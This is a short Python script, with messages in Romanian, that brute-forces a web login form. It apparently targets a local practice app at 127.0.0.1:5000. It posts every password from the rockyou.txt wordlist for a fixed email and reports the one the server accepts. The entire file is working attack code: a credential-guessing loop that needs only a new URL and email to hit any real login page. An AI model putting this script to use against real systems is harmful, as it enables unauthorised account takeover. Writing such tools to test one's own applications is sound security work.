import requests


url = "http://127.0.0.1:5000/login"
mail = "sef@gmail.com"
rockyou = "/usr/share/wordlists/rockyou.txt"



try:
    with open(rockyou, "r") as file:
        cnt = 0
        for line in file:
            password = line.strip()
            cnt += 1
            
            response = requests.post(url, data={
                "email": mail, 
                "password": password
            })

            if "Parola gresita" not in response.text and "Utilizatorul nu exista" not in response.text:
                print(f"\nSUCCES! Parola gasita: {password}")
                print(f"Incercari totale: {cnt}")
                break
            
            if cnt % 100 == 0:
                print(f"Incercari efectuate: {cnt}...", end="\r")

except FileNotFoundError:
    print("Eroare: rockyou.txt nu a fost gasit la calea specificata!")
